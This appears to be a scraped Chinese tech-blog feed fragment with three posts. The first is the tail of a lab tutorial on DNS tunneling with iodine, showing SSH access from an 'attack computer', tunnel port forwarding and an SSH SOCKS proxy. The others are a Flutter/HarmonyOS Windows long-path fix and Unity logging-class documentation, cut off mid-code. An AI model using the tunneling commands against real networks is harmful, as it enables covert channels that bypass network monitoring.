<p>上面成功在攻击电脑中直接SSH登录到另一台</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ddab3525f6e449a9005cadc914e2aa4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y2X55Oc5LiA5peP:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770879016&amp;x-signature=vwrNI73P5KYzPb4BX%2Ffb1PqqjYs%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h4 data-id="heading-15">Step 2：端口转发（高级用法）</h4>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-comment"># 通过隧道转发端口</span>
<span class="hljs-comment"># 客户端运行：将本地 8080 转发到服务端</span>
iodine ... -L <span class="hljs-number">8080</span><span class="hljs-symbol">:localhost</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span>

<span class="hljs-comment"># 或者使用 SSH 动态代理</span>
ssh -D <span class="hljs-number">1080</span> root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.200</span>.<span class="hljs-number">2</span>
<span class="hljs-comment"># 然后浏览器设置 SOCKS5 代理 127.0.0.1:1080</span>
</code></pre>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【坑位提醒】Flutter 鸿蒙开发：Mac 跑得好好的，Windows 报 Git 依赖版本错误？半天心血总结出的真相！]]></title>    <link>https://juejin.cn/post/7602936997175132212</link>    <guid>https://juejin.cn/post/7602936997175132212</guid>    <pubDate>2026-02-05T07:00:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602936997175132212" data-draft-id="7602901195154440244" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【坑位提醒】Flutter 鸿蒙开发：Mac 跑得好好的，Windows 报 Git 依赖版本错误？半天心血总结出的真相！"/> <meta itemprop="keywords" content="Flutter,HarmonyOS"/> <meta itemprop="datePublished" content="2026-02-05T07:00:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="浅蓝色"/> <meta itemprop="url" content="https://juejin.cn/user/1919072243027988"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【坑位提醒】Flutter 鸿蒙开发：Mac 跑得好好的，Windows 报 Git 依赖版本错误？半天心血总结出的真相！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1919072243027988/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    浅蓝色
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T07:00:26.000Z" title="Thu Feb 05 2026 07:00:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">前言</h3>
<p>在进行 Flutter 鸿蒙开发时，由于很多插件（如 <code>image_picker</code>, <code>file_selector</code>）需要引用华为或 SIG 维护的特定分支。你可能会遇到一个极其离谱的现象：<strong>同一个项目代码，之前在 Mac 上 <code>flutter pub get</code> 秒过，在 Windows 上却死活报错：</strong></p>
<p><code>ERR: Package not available (the pubspec for image_picker 1.1.2 from git has version 1.0.2).</code></p>
<p>明明 Git 仓库里版本是对的，为什么 Windows 固执地认为它是旧版本？本文带你一分钟跳坑。</p>
<hr/>
<h3 data-id="heading-1">一、 现象描述</h3>
<p>在 <code>pubspec.yaml</code> 中配置了如下依赖：</p>
<p>YAML</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">image_picker:</span>
  <span class="hljs-attr">git:</span>
    <span class="hljs-attr">url:</span> <span class="hljs-string">https://gitcode.com/openharmony-sig/flutter_packages.git</span>
    <span class="hljs-attr">path:</span> <span class="hljs-string">packages/image_picker/image_picker</span>
    <span class="hljs-attr">ref:</span> <span class="hljs-string">br_image_picker-v1.1.2_ohos</span>  <span class="hljs-comment"># 明确指向 1.1.2 版本</span>
</code></pre>
<p><strong>报错信息：</strong></p>
<blockquote>
<p><code>Package not available (the pubspec for image_picker 1.1.2 from git has version 1.0.2).</code></p>
</blockquote>
<p>你去浏览器里翻openharmony-sig的源码，明明br_image_picker-v1.1.2_ohos的版本号就是 <code>1.1.2</code>。你甚至怀疑是不是 GitCode 挂了，或者是自己眼睛花了。</p>
<hr/>
<h3 data-id="heading-2">二、 幕后真凶：Windows 的“长路径限制”</h3>
<p>这其实不是 Flutter 的 Bug，也不是 Git 的 Bug，而是 <strong>Windows 文件系统默认限制（MAX_PATH: 260字符）</strong> 与 <strong>Git 静默失败</strong> 共同酿成的惨剧。</p>
<h4 data-id="heading-3">1. 路径太深了</h4>
<p>Flutter 在缓存 Git 依赖时，路径极深：</p>
<p><code>C:\Users\你的用户名\AppData\Local\Pub\Cache\git\flutter_packages-xxxx\packages\image_picker\image_picker\pubspec.yaml</code></p>
<p>这个路径轻轻松松就会突破 260 个字符。</p>
<h4 data-id="heading-4">2. Git 的“摆烂”行为</h4>
<p>当路径超过限制时，Windows 版 Git 在执行 <code>checkout</code>（切换分支）时会<strong>静默失败</strong>。</p>
<ul>
<li><strong>结果：</strong> Git 以为自己切到了新分支，但磁盘上的文件实际上还是<strong>默认分支</strong>（可能是 master 或旧版）的内容。</li>
<li><strong>Pub 的反应：</strong> Pub 工具去读磁盘上的 <code>pubspec.yaml</code>，发现版本号跟预期不符，直接报错退出。</li>
</ul>
<hr/>
<h3 data-id="heading-5">三、 终极解决方案（三步走）</h3>
<p>如果你在 Windows 上遇到这个“版本对不上”的逆天报错，请按以下步骤操作：</p>
<h4 data-id="heading-6">1. 开启 Windows 系统长路径支持</h4>
<p>以<strong>管理员身份</strong>打开 PowerShell，运行以下命令：</p>
<p>PowerShell</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">New</span><span class="hljs-operator">-</span>ItemProperty <span class="hljs-operator">-</span>Path "HKLM:\System\CurrentControlSet\Control\FileSystem" `
<span class="hljs-operator">-</span>Name "LongPathsEnabled" <span class="hljs-operator">-</span><span class="hljs-keyword">Value</span> <span class="hljs-number">1</span> <span class="hljs-operator">-</span>PropertyType DWORD <span class="hljs-operator">-</span>Force
</code></pre>
<h4 data-id="heading-7">2. 开启 Git 的长路径支持</h4>
<p>在终端运行：</p>
<p>Bash</p>
<pre><code class="hljs language-arduino" lang="arduino">git config --global core.longpaths <span class="hljs-literal">true</span>
</code></pre>
<h4 data-id="heading-8">3. 强力清除“有毒”缓存</h4>
<p>这是最关键的一步，必须手动清理已经出错的本地缓存：</p>
<ol>
<li>
<p><strong>删除 Pub 缓存中的 Git 目录：</strong></p>
<p>直接删除 <code>C:\Users\你的用户名\AppData\Local\Pub\Cache\git</code> 下的所有内容。</p>
</li>
<li>
<p><strong>删除项目锁文件：</strong></p>
<p>删除项目根目录下的 <code>pubspec.lock</code>。</p>
</li>
<li>
<p><strong>重新获取：</strong></p>
<p>运行 <code>flutter pub get</code>。</p>
</li>
</ol>
<hr/>
<h3 data-id="heading-9">四、 总结</h3>
<p>鸿蒙适配之路本就坎坷，Windows 的这个环境坑更是杀人于无形。</p>
<ul>
<li><strong>Mac 没事：</strong> 因为 Unix 系系统没有这种古老的路径长度限制。</li>
<li><strong>Windows 报错：</strong> 往往是因为路径过深导致 Git 切换分支失败。</li>
</ul>
<p><strong>一句话经验：在 Windows 上搞 Flutter 开发，第一件事就是把系统的 <code>LongPathsEnabled</code> 给开了！</strong></p>
<p>希望这篇文档能帮到正在绝望中的你。如果解决了你的问题，记得点个赞！</p>
<hr/>
<h3 data-id="heading-10">互动环节</h3>
<blockquote>
<p>你在鸿蒙适配过程中还遇到了哪些“离谱”的报错？欢迎在评论区交流，我们一起排坑！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[DebugExtensions]]></title>    <link>https://juejin.cn/post/7602900131542237225</link>    <guid>https://juejin.cn/post/7602900131542237225</guid>    <pubDate>2026-02-05T06:33:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602900131542237225" data-draft-id="7603004323911548934" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="DebugExtensions"/> <meta itemprop="keywords" content="Unity3D"/> <meta itemprop="datePublished" content="2026-02-05T06:33:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Wembanyama"/> <meta itemprop="url" content="https://juejin.cn/user/3699191947468376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            DebugExtensions
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3699191947468376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Wembanyama
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:33:14.000Z" title="Thu Feb 05 2026 06:33:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述（Overview）</h2>
<p>DebugExtensions 是一个简单的 <strong>Unity 调试日志控制类</strong>，位于 PFGameFramework.Library 命名空间。</p>
<p>主要功能：</p>
<ul>
<li>通过一个统一的开关（debugOnOff）控制所有 Debug.Log、Debug.LogWarning、Debug.LogError 的输出</li>
<li>避免在正式发布版本中输出大量调试日志（尤其在移动端或性能敏感场景）</li>
<li>提供带前缀的日志格式，便于在控制台中快速区分</li>
<li>调试期间开启，部署/发布时关闭</li>
</ul>
<p>该类采用 <strong>MonoBehaviour + 静态方法</strong> 的设计模式：</p>
<ul>
<li>在场景中挂载一个 GameObject 并设置 debugOnOff 开关</li>
<li>其他脚本通过静态方法 DebugExtensions.Log 等调用</li>
</ul>
<p><strong>典型使用场景</strong>：</p>
<ul>
<li>开发阶段开启日志</li>
<li>提测/发布时关闭所有调试输出</li>
<li>统一管理日志格式，便于筛选和排查</li>
</ul>
<hr/>
<h2 data-id="heading-1">组件属性</h2>

















<table><thead><tr><th>属性名</th><th>类型</th><th>默认值</th><th>说明</th></tr></thead><tbody><tr><td>debugOnOff</td><td>bool</td><td>true</td><td>是否开启调试日志（Inspector 可视化开关）</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-2">静态方法一览（API Index）</h2>

































<table><thead><tr><th>方法名</th><th>静态</th><th>参数类型</th><th>功能</th><th>典型用法</th></tr></thead><tbody><tr><td>Log</td><td>是</td><td>object</td><td>输出普通日志（带“输出内容：”前缀）</td><td>常规调试信息</td></tr><tr><td>LogWarning</td><td>是</td><td>object</td><td>输出警告日志（带“输出警告：”前缀）</td><td>可能有问题但不致命的情况</td></tr><tr><td>LogError</td><td>是</td><td>object</td><td>输出错误日志（带“输出错误：”前缀）</td><td>严重错误、异常情况</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-3">方法详情</h2>
<h3 data-id="heading-4">Log</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 输出普通调试信息，仅在 debugOnOff 为 true 时生效</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 日志格式：输出内容：{内容}</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="des"&gt;</span>要输出的内容（支持任意对象，会调用 ToString()）<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> des</span>)
</span></code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-sql" lang="sql">DebugExtensions.<span class="hljs-built_in">Log</span>("玩家血量：" <span class="hljs-operator">+</span> playerHealth);
DebugExtensions.<span class="hljs-built_in">Log</span>(gameObject);
</code></pre>
<p><strong>输出示例</strong>（控制台）：</p>
<pre><code class="hljs language-scss" lang="scss">输出内容：玩家血量：<span class="hljs-number">85</span>
输出内容：Player (UnityEngine.GameObject)
</code></pre>
<hr/>
<h3 data-id="heading-5">LogWarning</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 输出警告信息，仅在 debugOnOff 为 true 时生效</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 日志格式：输出警告：{内容}</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="des"&gt;</span>要输出的警告内容<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">LogWarning</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> des</span>)
</span></code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-erlang" lang="erlang"><span class="hljs-function"><span class="hljs-title">if</span> <span class="hljs-params">(itemCount &lt;= <span class="hljs-number">0</span>)</span>
    D<span class="hljs-title">ebugExtensions</span>.L<span class="hljs-title">ogWarning</span><span class="hljs-params">(<span class="hljs-string">"背包已空，无法使用物品"</span>)</span>;
</span></code></pre>
<p><strong>输出示例</strong>：</p>
<pre><code class="hljs">输出警告：背包已空，无法使用物品
</code></pre>
<hr/>
<h3 data-id="heading-6">LogError</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 输出错误信息，仅在 debugOnOff 为 true 时生效</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> 日志格式：输出错误：{内容}</span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;/summary&gt;</span></span>
<span class="hljs-comment"><span class="hljs-doctag">///</span> <span class="hljs-doctag">&lt;param name="des"&gt;</span>要输出的错误内容<span class="hljs-doctag">&lt;/param&gt;</span></span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">LogError</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> des</span>)
</span></code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-ini" lang="ini">if (<span class="hljs-attr">target</span> == null)
    DebugExtensions.LogError("目标物体为空，无法移动！")<span class="hljs-comment">;</span>
</code></pre>
<p><strong>输出示例</strong>（红色）：</p>
<pre><code class="hljs">输出错误：目标物体为空，无法移动！
</code></pre>
<hr/>
<h2 data-id="heading-7">使用方式</h2>
<h3 data-id="heading-8">1. 挂载方式（推荐）</h3>
<ol>
<li>
<p>在场景中创建一个空 GameObject（建议命名为 DebugController）</p>
</li>
<li>
<p>将 DebugExtensions 脚本挂载到该物体上</p>
</li>
<li>
<p>在 Inspector 中设置 debugOnOff 开关</p>
<ul>
<li>开发/调试时：勾选（true）</li>
<li>打包/发布时：取消勾选（false）</li>
</ul>
</li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 任意脚本中调用</span>
DebugExtensions.<span class="hljs-built_in">Log</span>(<span class="hljs-string">"当前帧率："</span> + (<span class="hljs-number">1f</span> / Time.deltaTime));
</code></pre>
<h3 data-id="heading-9">2. 全局开关控制</h3>
<p>debugOnOff 只在 Awake 时读取一次，存储在静态字段 _openDebug 中。</p>
<p>如果需要在运行时动态开关，可以直接修改静态字段：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">DebugExtensions._openDebug</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;  // 运行中关闭日志（不推荐频繁改）</span>
</code></pre>
<p><strong>注意</strong>：_openDebug 是 private static，建议通过暴露公共方法来控制开关（如 SetDebugEnabled(bool)）。</p>
<hr/>
<h2 data-id="heading-10">改进建议</h2>
<p>当前实现较为基础，可考虑以下增强：</p>
<ol>
<li><strong>添加开关控制方法</strong></li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">SetDebugEnabled</span><span class="hljs-params">(<span class="hljs-type">bool</span> enabled)</span>
</span>{
    _openDebug = enabled;
}
</code></pre>
<ol start="2">
<li><strong>支持日志标签/分类</strong></li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> message, <span class="hljs-built_in">string</span> tag = <span class="hljs-string">"Default"</span></span>)</span>
{
    <span class="hljs-keyword">if</span> (_openDebug)
        Debug.Log(<span class="hljs-string">$"[<span class="hljs-subst">{tag}</span>] <span class="hljs-subst">{message}</span>"</span>);
}
</code></pre>
<ol start="3">
<li><strong>支持条件编译</strong></li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta">#<span class="hljs-keyword">if</span> UNITY_EDITOR || DEVELOPMENT_BUILD</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> des</span>)</span> { ... }
